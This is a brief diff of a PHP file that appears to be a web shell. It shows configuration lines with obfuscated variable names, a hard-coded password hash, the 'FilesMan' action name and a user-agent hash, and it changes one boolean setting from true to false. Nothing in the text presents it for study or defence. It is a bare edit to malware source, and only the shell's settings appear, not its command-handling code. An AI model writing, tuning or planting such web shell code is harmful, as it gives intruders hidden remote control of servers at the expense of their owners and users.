@@ -5,7 +5,7 @@ if(array_key_exists('watching',$_POST)){
 }
 //-----------------Password---------------------
 $▛ = "fa769dac7a0a94ee47d8ebe021eaba9e";
-$▘ = true;
+$▘ = false;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
 $▙ = md5($_SERVER['HTTP_USER_AGENT']);
